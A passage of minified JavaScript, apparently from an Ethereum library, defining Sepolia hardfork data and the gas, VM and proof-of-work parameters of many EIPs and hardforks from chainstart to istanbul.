            forkHash: "0xfe3366e7"
        }, {
            name: "constantinople",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            name: "petersburg",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            name: "istanbul",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            name: "muirGlacier",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            name: "berlin",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            name: "london",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            "//_comment": "The forkHash will remain same as mergeForkIdTransition is post merge, terminal block: https://sepolia.etherscan.io/block/1450408",
            name: "merge",
            ttd: "17000000000000000",
            block: 1450409,
            forkHash: "0xfe3366e7"
        }, {
            name: "mergeForkIdTransition",
            block: 1735371,
            forkHash: "0xb96cbd13"
        }, {
            name: "shanghai",
            block: null,
            timestamp: "1677557088",
            forkHash: "0xf7f9bc08"
        }],
        bootstrapNodes: [],
        dnsNetworks: ["enrtree://AKA3AM6LPBYEUDMVNU3BSVQJ5AD45Y7YPOHJLEF6W26QOE4VTUDPE@all.sepolia.ethdisco.net"]
    }
      , E3 = {
        name: "EIP-1153",
        number: 1153,
        comment: "Transient Storage",
        url: "https://eips.ethereum.org/EIPS/eip-1153",
        status: "Review",
        minimumHardfork: "chainstart",
        requiredEIPs: [],
        gasConfig: {},
        gasPrices: {
            tstore: {
                v: 100,
                d: "Base fee of the TSTORE opcode"
            },
            tload: {
                v: 100,
                d: "Base fee of the TLOAD opcode"
            }
        },
        vm: {},
        pow: {}
    }
      , x3 = {
        name: "EIP-1559",
        number: 1559,
        comment: "Fee market change for ETH 1.0 chain",
        url: "https://eips.ethereum.org/EIPS/eip-1559",
        status: "Final",
        minimumHardfork: "berlin",
        requiredEIPs: [2930],
        gasConfig: {
            baseFeeMaxChangeDenominator: {
                v: 8,
                d: "Maximum base fee change denominator"
            },
            elasticityMultiplier: {
                v: 2,
                d: "Maximum block gas target elasticity"
            },
            initialBaseFee: {
                v: 1e9,
                d: "Initial base fee on first EIP1559 block"
            }
        },
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , S3 = {
        name: "EIP-2315",
        number: 2315,
        comment: "Simple subroutines for the EVM",
        url: "https://eips.ethereum.org/EIPS/eip-2315",
        status: "Draft",
        minimumHardfork: "istanbul",
        gasConfig: {},
        gasPrices: {
            beginsub: {
                v: 2,
                d: "Base fee of the BEGINSUB opcode"
            },
            returnsub: {
                v: 5,
                d: "Base fee of the RETURNSUB opcode"
            },
            jumpsub: {
                v: 10,
                d: "Base fee of the JUMPSUB opcode"
            }
        },
        vm: {},
        pow: {}
    }
      , T3 = {
        name: "EIP-2537",
        number: 2537,
        comment: "BLS12-381 precompiles",
        url: "https://eips.ethereum.org/EIPS/eip-2537",
        status: "Draft",
        minimumHardfork: "chainstart",
        gasConfig: {},
        gasPrices: {
            Bls12381G1AddGas: {
                v: 600,
                d: "Gas cost of a single BLS12-381 G1 addition precompile-call"
            },
            Bls12381G1MulGas: {
                v: 12e3,
                d: "Gas cost of a single BLS12-381 G1 multiplication precompile-call"
            },
            Bls12381G2AddGas: {
                v: 4500,
                d: "Gas cost of a single BLS12-381 G2 addition precompile-call"
            },
            Bls12381G2MulGas: {
                v: 55e3,
                d: "Gas cost of a single BLS12-381 G2 multiplication precompile-call"
            },
            Bls12381PairingBaseGas: {
                v: 115e3,
                d: "Base gas cost of BLS12-381 pairing check"
            },
            Bls12381PairingPerPairGas: {
                v: 23e3,
                d: "Per-pair gas cost of BLS12-381 pairing check"
            },
            Bls12381MapG1Gas: {
                v: 5500,
                d: "Gas cost of BLS12-381 map field element to G1"
            },
            Bls12381MapG2Gas: {
                v: 11e4,
                d: "Gas cost of BLS12-381 map field element to G2"
            },
            Bls12381MultiExpGasDiscount: {
                v: [[1, 1200], [2, 888], [3, 764], [4, 641], [5, 594], [6, 547], [7, 500], [8, 453], [9, 438], [10, 423], [11, 408], [12, 394], [13, 379], [14, 364], [15, 349], [16, 334], [17, 330], [18, 326], [19, 322], [20, 318], [21, 314], [22, 310], [23, 306], [24, 302], [25, 298], [26, 294], [27, 289], [28, 285], [29, 281], [30, 277], [31, 273], [32, 269], [33, 268], [34, 266], [35, 265], [36, 263], [37, 262], [38, 260], [39, 259], [40, 257], [41, 256], [42, 254], [43, 253], [44, 251], [45, 250], [46, 248], [47, 247], [48, 245], [49, 244], [50, 242], [51, 241], [52, 239], [53, 238], [54, 236], [55, 235], [56, 233], [57, 232], [58, 231], [59, 229], [60, 228], [61, 226], [62, 225], [63, 223], [64, 222], [65, 221], [66, 220], [67, 219], [68, 219], [69, 218], [70, 217], [71, 216], [72, 216], [73, 215], [74, 214], [75, 213], [76, 213], [77, 212], [78, 211], [79, 211], [80, 210], [81, 209], [82, 208], [83, 208], [84, 207], [85, 206], [86, 205], [87, 205], [88, 204], [89, 203], [90, 202], [91, 202], [92, 201], [93, 200], [94, 199], [95, 199], [96, 198], [97, 197], [98, 196], [99, 196], [100, 195], [101, 194], [102, 193], [103, 193], [104, 192], [105, 191], [106, 191], [107, 190], [108, 189], [109, 188], [110, 188], [111, 187], [112, 186], [113, 185], [114, 185], [115, 184], [116, 183], [117, 182], [118, 182], [119, 181], [120, 180], [121, 179], [122, 179], [123, 178], [124, 177], [125, 176], [126, 176], [127, 175], [128, 174]],
                d: "Discount gas costs of calls to the MultiExp precompiles with `k` (point, scalar) pair"
            }
        },
        vm: {},
        pow: {}
    }
      , R3 = {
        name: "EIP-2565",
        number: 2565,
        comment: "ModExp gas cost",
        url: "https://eips.ethereum.org/EIPS/eip-2565",
        status: "Final",
        minimumHardfork: "byzantium",
        gasConfig: {},
        gasPrices: {
            modexpGquaddivisor: {
                v: 3,
                d: "Gquaddivisor from modexp precompile for gas calculation"
            }
        },
        vm: {},
        pow: {}
    }
      , B3 = {
        name: "EIP-2718",
        comment: "Typed Transaction Envelope",
        url: "https://eips.ethereum.org/EIPS/eip-2718",
        status: "Final",
        minimumHardfork: "chainstart",
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , C3 = {
        name: "EIP-2929",
        comment: "Gas cost increases for state access opcodes",
        url: "https://eips.ethereum.org/EIPS/eip-2929",
        status: "Final",
        minimumHardfork: "chainstart",
        gasConfig: {},
        gasPrices: {
            coldsload: {
                v: 2100,
                d: "Gas cost of the first read of storage from a given location (per transaction)"
            },
            coldaccountaccess: {
                v: 2600,
                d: "Gas cost of the first read of a given address (per transaction)"
            },
            warmstorageread: {
                v: 100,
                d: "Gas cost of reading storage locations which have already loaded 'cold'"
            },
            sstoreCleanGasEIP2200: {
                v: 2900,
                d: "Once per SSTORE operation from clean non-zero to something else"
            },
            sstoreNoopGasEIP2200: {
                v: 100,
                d: "Once per SSTORE operation if the value doesn't change"
            },
            sstoreDirtyGasEIP2200: {
                v: 100,
                d: "Once per SSTORE operation if a dirty value is changed"
            },
            sstoreInitRefundEIP2200: {
                v: 19900,
                d: "Once per SSTORE operation for resetting to the original zero value"
            },
            sstoreCleanRefundEIP2200: {
                v: 4900,
                d: "Once per SSTORE operation for resetting to the original non-zero value"
            },
            call: {
                v: 0,
                d: "Base fee of the CALL opcode"
            },
            callcode: {
                v: 0,
                d: "Base fee of the CALLCODE opcode"
            },
            delegatecall: {
                v: 0,
                d: "Base fee of the DELEGATECALL opcode"
            },
            staticcall: {
                v: 0,
                d: "Base fee of the STATICCALL opcode"
            },
            balance: {
                v: 0,
                d: "Base fee of the BALANCE opcode"
            },
            extcodesize: {
                v: 0,
                d: "Base fee of the EXTCODESIZE opcode"
            },
            extcodecopy: {
                v: 0,
                d: "Base fee of the EXTCODECOPY opcode"
            },
            extcodehash: {
                v: 0,
                d: "Base fee of the EXTCODEHASH opcode"
            },
            sload: {
                v: 0,
                d: "Base fee of the SLOAD opcode"
            },
            sstore: {
                v: 0,
                d: "Base fee of the SSTORE opcode"
            }
        },
        vm: {},
        pow: {}
    }
      , I3 = {
        name: "EIP-2930",
        comment: "Optional access lists",
        url: "https://eips.ethereum.org/EIPS/eip-2930",
        status: "Final",
        minimumHardfork: "istanbul",
        requiredEIPs: [2718, 2929],
        gasConfig: {},
        gasPrices: {
            accessListStorageKeyCost: {
                v: 1900,
                d: "Gas cost per storage key in an Access List transaction"
            },
            accessListAddressCost: {
                v: 2400,
                d: "Gas cost per storage key in an Access List transaction"
            }
        },
        vm: {},
        pow: {}
    }
      , k3 = {
        name: "EIP-3198",
        number: 3198,
        comment: "BASEFEE opcode",
        url: "https://eips.ethereum.org/EIPS/eip-3198",
        status: "Final",
        minimumHardfork: "london",
        gasConfig: {},
        gasPrices: {
            basefee: {
                v: 2,
                d: "Gas cost of the BASEFEE opcode"
            }
        },
        vm: {},
        pow: {}
    }
      , O3 = {
        name: "EIP-3529",
        comment: "Reduction in refunds",
        url: "https://eips.ethereum.org/EIPS/eip-3529",
        status: "Final",
        minimumHardfork: "berlin",
        requiredEIPs: [2929],
        gasConfig: {
            maxRefundQuotient: {
                v: 5,
                d: "Maximum refund quotient; max tx refund is min(tx.gasUsed/maxRefundQuotient, tx.gasRefund)"
            }
        },
        gasPrices: {
            selfdestructRefund: {
                v: 0,
                d: "Refunded following a selfdestruct operation"
            },
            sstoreClearRefundEIP2200: {
                v: 4800,
                d: "Once per SSTORE operation for clearing an originally existing storage slot"
            }
        },
        vm: {},
        pow: {}
    }
      , N3 = {
        name: "EIP-3540",
        number: 3540,
        comment: "EVM Object Format (EOF) v1",
        url: "https://eips.ethereum.org/EIPS/eip-3540",
        status: "Review",
        minimumHardfork: "london",
        requiredEIPs: [3541],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , M3 = {
        name: "EIP-3541",
        comment: "Reject new contracts starting with the 0xEF byte",
        url: "https://eips.ethereum.org/EIPS/eip-3541",
        status: "Final",
        minimumHardfork: "berlin",
        requiredEIPs: [],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , D3 = {
        name: "EIP-3554",
        comment: "Reduction in refunds",
        url: "Difficulty Bomb Delay to December 1st 2021",
        status: "Final",
        minimumHardfork: "muirGlacier",
        requiredEIPs: [],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {
            difficultyBombDelay: {
                v: 95e5,
                d: "the amount of blocks to delay the difficulty bomb with"
            }
        }
    }
      , L3 = {
        name: "EIP-3607",
        number: 3607,
        comment: "Reject transactions from senders with deployed code",
        url: "https://eips.ethereum.org/EIPS/eip-3607",
        status: "Final",
        minimumHardfork: "chainstart",
        requiredEIPs: [],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , U3 = {
        name: "EIP-3651",
        number: 3198,
        comment: "Warm COINBASE",
        url: "https://eips.ethereum.org/EIPS/eip-3651",
        status: "Review",
        minimumHardfork: "london",
        requiredEIPs: [2929],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , j3 = {
        name: "EIP-3670",
        number: 3670,
        comment: "EOF - Code Validation",
        url: "https://eips.ethereum.org/EIPS/eip-3670",
        status: "Review",
        minimumHardfork: "london",
        requiredEIPs: [3540],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , P3 = {
        name: "EIP-3675",
        number: 3675,
        comment: "Upgrade consensus to Proof-of-Stake",
        url: "https://eips.ethereum.org/EIPS/eip-3675",
        status: "Final",
        minimumHardfork: "london",
        requiredEIPs: [],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , H3 = {
        name: "EIP-3855",
        number: 3855,
        comment: "PUSH0 instruction",
        url: "https://eips.ethereum.org/EIPS/eip-3855",
        status: "Review",
        minimumHardfork: "chainstart",
        requiredEIPs: [],
        gasConfig: {},
        gasPrices: {
            push0: {
                v: 2,
                d: "Base fee of the PUSH0 opcode"
            }
        },
        vm: {},
        pow: {}
    }
      , z3 = {
        name: "EIP-3860",
        number: 3860,
        comment: "Limit and meter initcode",
        url: "https://eips.ethereum.org/EIPS/eip-3860",
        status: "Review",
        minimumHardfork: "spuriousDragon",
        requiredEIPs: [],
        gasConfig: {},
        gasPrices: {
            initCodeWordCost: {
                v: 2,
                d: "Gas to pay for each word (32 bytes) of initcode when creating a contract"
            }
        },
        vm: {
            maxInitCodeSize: {
                v: 49152,
                d: "Maximum length of initialization code when creating a contract"
            }
        },
        pow: {}
    }
      , G3 = {
        name: "EIP-4345",
        number: 4345,
        comment: "Difficulty Bomb Delay to June 2022",
        url: "https://eips.ethereum.org/EIPS/eip-4345",
        status: "Final",
        minimumHardfork: "london",
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {
            difficultyBombDelay: {
                v: 107e5,
                d: "the amount of blocks to delay the difficulty bomb with"
            }
        }
    }
      , q3 = {
        name: "EIP-4399",
        number: 4399,
        comment: "Supplant DIFFICULTY opcode with PREVRANDAO",
        url: "https://eips.ethereum.org/EIPS/eip-4399",
        status: "Review",
        minimumHardfork: "london",
        requiredEIPs: [],
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , F3 = {
        name: "EIP-5133",
        number: 5133,
        comment: "Delaying Difficulty Bomb to mid-September 2022",
        url: "https://eips.ethereum.org/EIPS/eip-5133",
        status: "Draft",
        minimumHardfork: "grayGlacier",
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {
            difficultyBombDelay: {
                v: 114e5,
                d: "the amount of blocks to delay the difficulty bomb with"
            }
        }
    }
      , Ca = {
        1153: E3,
        1559: x3,
        2315: S3,
        2537: T3,
        2565: R3,
        2718: B3,
        2929: C3,
        2930: I3,
        3198: k3,
        3529: O3,
        3540: N3,
        3541: M3,
        3554: D3,
        3607: L3,
        3651: U3,
        3670: j3,
        3675: P3,
        3855: H3,
        3860: z3,
        4345: G3,
        4399: q3,
        5133: F3
    }
      , Q3 = {
        name: "chainstart",
        comment: "Start of the Ethereum main chain",
        url: "",
        status: "",
        gasConfig: {
            minGasLimit: {
                v: 5e3,
                d: "Minimum the gas limit may ever be"
            },
            gasLimitBoundDivisor: {
                v: 1024,
                d: "The bound divisor of the gas limit, used in update calculations"
            },
            maxRefundQuotient: {
                v: 2,
                d: "Maximum refund quotient; max tx refund is min(tx.gasUsed/maxRefundQuotient, tx.gasRefund)"
            }
        },
        gasPrices: {
            base: {
                v: 2,
                d: "Gas base cost, used e.g. for ChainID opcode (Istanbul)"
            },
            tierStep: {
                v: [0, 2, 3, 5, 8, 10, 20],
                d: "Once per operation, for a selection of them"
            },
            exp: {
                v: 10,
                d: "Base fee of the EXP opcode"
            },
            expByte: {
                v: 10,
                d: "Times ceil(log256(exponent)) for the EXP instruction"
            },
            sha3: {
                v: 30,
                d: "Base fee of the SHA3 opcode"
            },
            sha3Word: {
                v: 6,
                d: "Once per word of the SHA3 operation's data"
            },
            sload: {
                v: 50,
                d: "Base fee of the SLOAD opcode"
            },
            sstoreSet: {
                v: 2e4,
                d: "Once per SSTORE operation if the zeroness changes from zero"
            },
            sstoreReset: {
                v: 5e3,
                d: "Once per SSTORE operation if the zeroness does not change from zero"
            },
            sstoreRefund: {
                v: 15e3,
                d: "Once per SSTORE operation if the zeroness changes to zero"
            },
            jumpdest: {
                v: 1,
                d: "Base fee of the JUMPDEST opcode"
            },
            log: {
                v: 375,
                d: "Base fee of the LOG opcode"
            },
            logData: {
                v: 8,
                d: "Per byte in a LOG* operation's data"
            },
            logTopic: {
                v: 375,
                d: "Multiplied by the * of the LOG*, per LOG transaction. e.g. LOG0 incurs 0 * c_txLogTopicGas, LOG4 incurs 4 * c_txLogTopicGas"
            },
            create: {
                v: 32e3,
                d: "Base fee of the CREATE opcode"
            },
            call: {
                v: 40,
                d: "Base fee of the CALL opcode"
            },
            callStipend: {
                v: 2300,
                d: "Free gas given at beginning of call"
            },
            callValueTransfer: {
                v: 9e3,
                d: "Paid for CALL when the value transfor is non-zero"
            },
            callNewAccount: {
                v: 25e3,
                d: "Paid for CALL when the destination address didn't exist prior"
            },
            selfdestructRefund: {
                v: 24e3,
                d: "Refunded following a selfdestruct operation"
            },
            memory: {
                v: 3,
                d: "Times the address of the (highest referenced byte in memory + 1). NOTE: referencing happens on read, write and in instructions such as RETURN and CALL"
            },
            quadCoeffDiv: {
                v: 512,
                d: "Divisor for the quadratic particle of the memory cost equation"
            },
            createData: {
                v: 200,
                d: ""
            },
            tx: {
                v: 21e3,
                d: "Per transaction. NOTE: Not payable on data of calls between transactions"
            },
            txCreation: {
                v: 32e3,
                d: "The cost of creating a contract via tx"
            },
            txDataZero: {
                v: 4,
                d: "Per byte of data attached to a transaction that equals zero. NOTE: Not payable on data of calls between transactions"
            },
            txDataNonZero: {
                v: 68,
                d: "Per byte of data attached to a transaction that is not equal to zero. NOTE: Not payable on data of calls between transactions"
            },
            copy: {
                v: 3,
                d: "Multiplied by the number of 32-byte words that are copied (round up) for any *COPY operation and added"
            },
            ecRecover: {
                v: 3e3,
                d: ""
            },
            sha256: {
                v: 60,
                d: ""
            },
            sha256Word: {
                v: 12,
                d: ""
            },
            ripemd160: {
                v: 600,
                d: ""
            },
            ripemd160Word: {
                v: 120,
                d: ""
            },
            identity: {
                v: 15,
                d: ""
            },
            identityWord: {
                v: 3,
                d: ""
            },
            stop: {
                v: 0,
                d: "Base fee of the STOP opcode"
            },
            add: {
                v: 3,
                d: "Base fee of the ADD opcode"
            },
            mul: {
                v: 5,
                d: "Base fee of the MUL opcode"
            },
            sub: {
                v: 3,
                d: "Base fee of the SUB opcode"
            },
            div: {
                v: 5,
                d: "Base fee of the DIV opcode"
            },
            sdiv: {
                v: 5,
                d: "Base fee of the SDIV opcode"
            },
            mod: {
                v: 5,
                d: "Base fee of the MOD opcode"
            },
            smod: {
                v: 5,
                d: "Base fee of the SMOD opcode"
            },
            addmod: {
                v: 8,
                d: "Base fee of the ADDMOD opcode"
            },
            mulmod: {
                v: 8,
                d: "Base fee of the MULMOD opcode"
            },
            signextend: {
                v: 5,
                d: "Base fee of the SIGNEXTEND opcode"
            },
            lt: {
                v: 3,
                d: "Base fee of the LT opcode"
            },
            gt: {
                v: 3,
                d: "Base fee of the GT opcode"
            },
            slt: {
                v: 3,
                d: "Base fee of the SLT opcode"
            },
            sgt: {
                v: 3,
                d: "Base fee of the SGT opcode"
            },
            eq: {
                v: 3,
                d: "Base fee of the EQ opcode"
            },
            iszero: {
                v: 3,
                d: "Base fee of the ISZERO opcode"
            },
            and: {
                v: 3,
                d: "Base fee of the AND opcode"
            },
            or: {
                v: 3,
                d: "Base fee of the OR opcode"
            },
            xor: {
                v: 3,
                d: "Base fee of the XOR opcode"
            },
            not: {
                v: 3,
                d: "Base fee of the NOT opcode"
            },
            byte: {
                v: 3,
                d: "Base fee of the BYTE opcode"
            },
            address: {
                v: 2,
                d: "Base fee of the ADDRESS opcode"
            },
            balance: {
                v: 20,
                d: "Base fee of the BALANCE opcode"
            },
            origin: {
                v: 2,
                d: "Base fee of the ORIGIN opcode"
            },
            caller: {
                v: 2,
                d: "Base fee of the CALLER opcode"
            },
            callvalue: {
                v: 2,
                d: "Base fee of the CALLVALUE opcode"
            },
            calldataload: {
                v: 3,
                d: "Base fee of the CALLDATALOAD opcode"
            },
            calldatasize: {
                v: 2,
                d: "Base fee of the CALLDATASIZE opcode"
            },
            calldatacopy: {
                v: 3,
                d: "Base fee of the CALLDATACOPY opcode"
            },
            codesize: {
                v: 2,
                d: "Base fee of the CODESIZE opcode"
            },
            codecopy: {
                v: 3,
                d: "Base fee of the CODECOPY opcode"
            },
            gasprice: {
                v: 2,
                d: "Base fee of the GASPRICE opcode"
            },
            extcodesize: {
                v: 20,
                d: "Base fee of the EXTCODESIZE opcode"
            },
            extcodecopy: {
                v: 20,
                d: "Base fee of the EXTCODECOPY opcode"
            },
            blockhash: {
                v: 20,
                d: "Base fee of the BLOCKHASH opcode"
            },
            coinbase: {
                v: 2,
                d: "Base fee of the COINBASE opcode"
            },
            timestamp: {
                v: 2,
                d: "Base fee of the TIMESTAMP opcode"
            },
            number: {
                v: 2,
                d: "Base fee of the NUMBER opcode"
            },
            difficulty: {
                v: 2,
                d: "Base fee of the DIFFICULTY opcode"
            },
            gaslimit: {
                v: 2,
                d: "Base fee of the GASLIMIT opcode"
            },
            pop: {
                v: 2,
                d: "Base fee of the POP opcode"
            },
            mload: {
                v: 3,
                d: "Base fee of the MLOAD opcode"
            },
            mstore: {
                v: 3,
                d: "Base fee of the MSTORE opcode"
            },
            mstore8: {
                v: 3,
                d: "Base fee of the MSTORE8 opcode"
            },
            sstore: {
                v: 0,
                d: "Base fee of the SSTORE opcode"
            },
            jump: {
                v: 8,
                d: "Base fee of the JUMP opcode"
            },
            jumpi: {
                v: 10,
                d: "Base fee of the JUMPI opcode"
            },
            pc: {
                v: 2,
                d: "Base fee of the PC opcode"
            },
            msize: {
                v: 2,
                d: "Base fee of the MSIZE opcode"
            },
            gas: {
                v: 2,
                d: "Base fee of the GAS opcode"
            },
            push: {
                v: 3,
                d: "Base fee of the PUSH opcode"
            },
            dup: {
                v: 3,
                d: "Base fee of the DUP opcode"
            },
            swap: {
                v: 3,
                d: "Base fee of the SWAP opcode"
            },
            callcode: {
                v: 40,
                d: "Base fee of the CALLCODE opcode"
            },
            return: {
                v: 0,
                d: "Base fee of the RETURN opcode"
            },
            invalid: {
                v: 0,
                d: "Base fee of the INVALID opcode"
            },
            selfdestruct: {
                v: 0,
                d: "Base fee of the SELFDESTRUCT opcode"
            }
        },
        vm: {
            stackLimit: {
                v: 1024,
                d: "Maximum size of VM stack allowed"
            },
            callCreateDepth: {
                v: 1024,
                d: "Maximum depth of call/create stack"
            },
            maxExtraDataSize: {
                v: 32,
                d: "Maximum size extra data may be after Genesis"
            }
        },
        pow: {
            minimumDifficulty: {
                v: 131072,
                d: "The minimum that the difficulty may ever be"
            },
            difficultyBoundDivisor: {
                v: 2048,
                d: "The bound divisor of the difficulty, used in the update calculations"
            },
            durationLimit: {
                v: 13,
                d: "The decision boundary on the blocktime duration used to determine whether difficulty should go up or not"
            },
            epochDuration: {
                v: 3e4,
                d: "Duration between proof-of-work epochs"
            },
            timebombPeriod: {
                v: 1e5,
                d: "Exponential difficulty timebomb period"
            },
            minerReward: {
                v: "5000000000000000000",
                d: "the amount a miner get rewarded for mining a block"
            },
            difficultyBombDelay: {
                v: 0,
                d: "the amount of blocks to delay the difficulty bomb with"
            }
        }
    }
      , V3 = {
        name: "dao",
        comment: "DAO rescue hardfork",
        url: "https://eips.ethereum.org/EIPS/eip-779",
        status: "Final",
        gasConfig: {},
        gasPrices: {},
        vm: {},
        pow: {}
    }
      , Y3 = {
        name: "homestead",
        comment: "Homestead hardfork with protocol and network changes",
        url: "https://eips.ethereum.org/EIPS/eip-606",
        status: "Final",
        gasConfig: {},
        gasPrices: {
            delegatecall: {
                v: 40,
                d: "Base fee of the DELEGATECALL opcode"
            }
        },
        vm: {},
        pow: {}
    }
      , Z3 = {
        name: "tangerineWhistle",
        comment: "Hardfork with gas cost changes for IO-heavy operations",
        url: "https://eips.ethereum.org/EIPS/eip-608",
        status: "Final",
        gasConfig: {},
        gasPrices: {
            sload: {
                v: 200,
                d: "Once per SLOAD operation"
            },
            call: {
                v: 700,
                d: "Once per CALL operation & message call transaction"
            },
            extcodesize: {
                v: 700,
                d: "Base fee of the EXTCODESIZE opcode"
            },
            extcodecopy: {
                v: 700,
                d: "Base fee of the EXTCODECOPY opcode"
            },
            balance: {
                v: 400,
                d: "Base fee of the BALANCE opcode"
            },
            delegatecall: {
                v: 700,
                d: "Base fee of the DELEGATECALL opcode"
            },
            callcode: {
                v: 700,
                d: "Base fee of the CALLCODE opcode"
            },
            selfdestruct: {
                v: 5e3,
                d: "Base fee of the SELFDESTRUCT opcode"
            }
        },
        vm: {},
        pow: {}
    }
      , K3 = {
        name: "spuriousDragon",
        comment: "HF with EIPs for simple replay attack protection, EXP cost increase, state trie clearing, contract code size limit",
        url: "https://eips.ethereum.org/EIPS/eip-607",
        status: "Final",
        gasConfig: {},
        gasPrices: {
            expByte: {
                v: 50,
                d: "Times ceil(log256(exponent)) for the EXP instruction"
            }
        },
        vm: {
            maxCodeSize: {
                v: 24576,
                d: "Maximum length of contract code"
            }
        },
        pow: {}
    }
      , X3 = {
        name: "byzantium",
        comment: "Hardfork with new precompiles, instructions and other protocol changes",
        url: "https://eips.ethereum.org/EIPS/eip-609",
        status: "Final",
        gasConfig: {},
        gasPrices: {
            modexpGquaddivisor: {
                v: 20,
                d: "Gquaddivisor from modexp precompile for gas calculation"
            },
            ecAdd: {
                v: 500,
                d: "Gas costs for curve addition precompile"
            },
            ecMul: {
                v: 4e4,
                d: "Gas costs for curve multiplication precompile"
            },
            ecPairing: {
                v: 1e5,
                d: "Base gas costs for curve pairing precompile"
            },
            ecPairingWord: {
                v: 8e4,
                d: "Gas costs regarding curve pairing precompile input length"
            },
            revert: {
                v: 0,
                d: "Base fee of the REVERT opcode"
            },
            staticcall: {
                v: 700,
                d: "Base fee of the STATICCALL opcode"
            },
            returndatasize: {
                v: 2,
                d: "Base fee of the RETURNDATASIZE opcode"
            },
            returndatacopy: {
                v: 3,
                d: "Base fee of the RETURNDATACOPY opcode"
            }
        },
        vm: {},
        pow: {
            minerReward: {
                v: "3000000000000000000",
                d: "the amount a miner get rewarded for mining a block"
            },
            difficultyBombDelay: {
                v: 3e6,
                d: "the amount of blocks to delay the difficulty bomb with"
            }
        }
    }
      , J3 = {
        name: "constantinople",
        comment: "Postponed hardfork including EIP-1283 (SSTORE gas metering changes)",
        url: "https://eips.ethereum.org/EIPS/eip-1013",
        status: "Final",
        gasConfig: {},
        gasPrices: {
            netSstoreNoopGas: {
                v: 200,
                d: "Once per SSTORE operation if the value doesn't change"
            },
            netSstoreInitGas: {
                v: 2e4,
                d: "Once per SSTORE operation from clean zero"
            },
            netSstoreCleanGas: {
                v: 5e3,
                d: "Once per SSTORE operation from clean non-zero"
            },
            netSstoreDirtyGas: {
                v: 200,
                d: "Once per SSTORE operation from dirty"
            },
            netSstoreClearRefund: {
                v: 15e3,
                d: "Once per SSTORE operation for clearing an originally existing storage slot"
            },
            netSstoreResetRefund: {
                v: 4800,
                d: "Once per SSTORE operation for resetting to the original non-zero value"
            },
            netSstoreResetClearRefund: {
                v: 19800,
                d: "Once per SSTORE operation for resetting to the original zero value"
            },
            shl: {
                v: 3,
                d: "Base fee of the SHL opcode"
            },
            shr: {
                v: 3,
                d: "Base fee of the SHR opcode"
            },
            sar: {
                v: 3,
                d: "Base fee of the SAR opcode"
            },
            extcodehash: {
                v: 400,
                d: "Base fee of the EXTCODEHASH opcode"
            },
            create2: {
                v: 32e3,
                d: "Base fee of the CREATE2 opcode"
            }
        },
        vm: {},
        pow: {
            minerReward: {
                v: "2000000000000000000",
                d: "The amount a miner gets rewarded for mining a block"
            },
            difficultyBombDelay: {
                v: 5e6,
                d: "the amount of blocks to delay the difficulty bomb with"
            }
        }
    }
      , $3 = {
        name: "petersburg",
        comment: "Aka constantinopleFix, removes EIP-1283, activate together with or after constantinople",
        url: "https://eips.ethereum.org/EIPS/eip-1716",
        status: "Final",
        gasConfig: {},
        gasPrices: {
            netSstoreNoopGas: {
                v: null,
                d: "Removed along EIP-1283"
            },
            netSstoreInitGas: {
                v: null,
                d: "Removed along EIP-1283"
            },
            netSstoreCleanGas: {
                v: null,
                d: "Removed along EIP-1283"
            },
            netSstoreDirtyGas: {
                v: null,
                d: "Removed along EIP-1283"
            },
            netSstoreClearRefund: {
                v: null,
                d: "Removed along EIP-1283"
            },
            netSstoreResetRefund: {
                v: null,
                d: "Removed along EIP-1283"
            },
            netSstoreResetClearRefund: {
                v: null,
                d: "Removed along EIP-1283"
            }
        },
        vm: {},
        pow: {}
    }
      , W3 = {
        name: "istanbul",
        comment: "HF targeted for December 2019 following the Constantinople/Petersburg HF",
        url: "https://eips.ethereum.org/EIPS/eip-1679",
        status: "Final",
        gasConfig: {},
        gasPrices: {
            blake2Round: {
                v: 1,
                d: "Gas cost per round for the Blake2 F precompile"
            },
            ecAdd: {
                v: 150,
                d: "Gas costs for curve addition precompile"
            },
            ecMul: {
                v: 6e3,
                d: "Gas costs for curve multiplication precompile"
            },
            ecPairing: {
                v: 45e3,
                d: "Base gas costs for curve pairing precompile"
            },
            ecPairingWord: {
                v: 34e3,
                d: "Gas costs regarding curve pairing precompile input length"
            },
            txDataNonZero: {
                v: 16,
                d: "Per byte of data attached to a transaction that is not equal to zero. NOTE: Not payable on data of calls between transactions"
            },
            sstoreSentryGasEIP2200: {
                v: 2300,
                d: "Minimum gas required to be present for an SSTORE call, not consumed"
            },
            sstoreNoopGasEIP2200: {
                v: 800,
                d: "Once per SSTORE operation if the value doesn't change"
            },
            sstoreDirtyGasEIP2200: {
                v: 800,
                d: "Once per SSTORE operation if a dirty value is changed"
            },
            sstoreInitGasEIP2200: {
                v: 2e4,
                d: "Once per SSTORE operation from clean zero to non-zero"
            },
            sstoreInitRefundEIP2200: {
                v: 19200,
                d: "Once per SSTORE operation for resetting to the original zero value"
            },
            sstoreCleanGasEIP2200: {
                v: 5e3,
                d: "Once per SSTORE operation from clean non-zero to something else"
            },
            sstoreCleanRefundEIP2200: {
                v: 4200,
                d: "Once per SSTORE operation for resetting to the original non-zero value"
            },
            sstoreClearRefundEIP2200: {
                v: 15e3,
                d: "Once per SSTORE operation for clearing an originally existing storage slot"
            },
            balance: {
                v: 700,
                d: "Base fee of the BALANCE opcode"
            },
            extcodehash: {
                v: 700,
                d: "Base fee of the EXTCODEHASH opcode"
            },
            chainid: {
                v: 2,
                d: "Base fee of the CHAINID opcode"
            },
            selfbalance: {
                v: 5,
                d: "Base fee of the SELFBALANCE opcode"
            },
            sload: {
                v: 800,
